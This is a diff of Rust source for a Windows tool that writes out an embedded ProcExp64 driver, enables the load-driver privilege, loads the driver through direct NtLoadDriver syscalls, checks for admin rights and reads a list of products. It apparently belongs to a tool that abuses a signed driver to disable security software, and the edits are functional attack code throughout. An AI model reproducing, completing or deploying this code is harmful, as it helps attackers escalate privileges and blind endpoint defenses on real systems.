@@ -4,11 +4,13 @@ use ntapi::ntioapi::NtLoadDriver;
 use rust_syscalls::syscall;
 use std::env;
 use std::fs;
+use std::fs::File;
 use std::include_bytes;
 use std::mem::size_of;
 use std::path::Path;
 use std::path::PathBuf;
 use std::process::exit;
+use std::process::Command;
 use std::ptr::null_mut;
 use sysinfo::PidExt;
 use sysinfo::ProcessExt;
@@ -35,11 +37,8 @@ use winapi::um::winnt::TOKEN_PRIVILEGES;
 use winapi::um::winnt::TOKEN_QUERY;
 use winreg::enums::*;
 use winreg::RegKey;
-use std::fs::File;
+use winapi::um::winnt::SE_LOAD_DRIVER_NAME;
 
-const SE_DEBUG_NAME: [u16; 17] = [
-    83u16, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0,
-];
 const DRIVERNAME: &str = "ProcExp64";
 
 fn load_driver(drivername: String) -> bool {
@@ -92,7 +91,7 @@ fn enable_privilege() -> bool {
 
         let ntstatus = LookupPrivilegeValueW(
             null_mut(),
-            SE_DEBUG_NAME.as_ptr(),
+            SE_LOAD_DRIVER_NAME.as_ptr(),
             &mut privilege.Privileges[0].Luid,
         );
         match ntstatus {
@@ -190,7 +189,10 @@ fn enable_privilege() -> bool {
                 return false;
             }
             _ => {
-                let message = format!("[+] Successfully used AdjustTokenPrivileges");
+                let message = format!(
+                    "[+] Successfully used AdjustTokenPrivileges. NTSTATUS: {}",
+                    ntstatus
+                );
                 println!("{}", message);
             }
         }
@@ -209,6 +211,16 @@ fn enable_privilege() -> bool {
         let _ = syscall!("NtClose", htoken);
         */
         let _ = syscall!("NtClose", htoken);
+
+        // for testing purpose:
+        
+        let cmd = Command::new("cmd")
+            .args(["/C", "whoami /priv"])
+            .output()
+            .expect("failed to execute process");
+
+        println!("{:#?}", cmd)
+        
     }
 
     return true;
@@ -256,11 +268,10 @@ fn write_driver() -> Result<PathBuf, Box<dyn std::error::Error>> {
 
 pub fn is_elevated() -> bool {
     // thanks to https://github.com/redcode-labs/Coldfire/blob/109a68f93162711068a110d8b29cca19061776d0/os_windows.go
-
     let file = File::open("\\\\.\\PHYSICALDRIVE0");
     match file {
         Ok(_) => return true,
-        Err(_) => return false
+        Err(_) => return false,
     }
 }
 
@@ -271,16 +282,13 @@ fn main() {
     for line in file_content.lines() {
         product_list.push(line)
     }
-    //let drivername = "ProcExp64";
 
     let args: Vec<String> = env::args().collect();
-
-    println!("Run this tool as SYSTEM for maximum effect");
 
     let is_elevated = is_elevated();
     match is_elevated {
         true => {
-            println!("[+] You have elevated rights, let's start..");
+            println!("[+] You have elevated rights, let's go");
         }
         false => {
             panic!("[-] You don't have elevated rights. Aborting..");
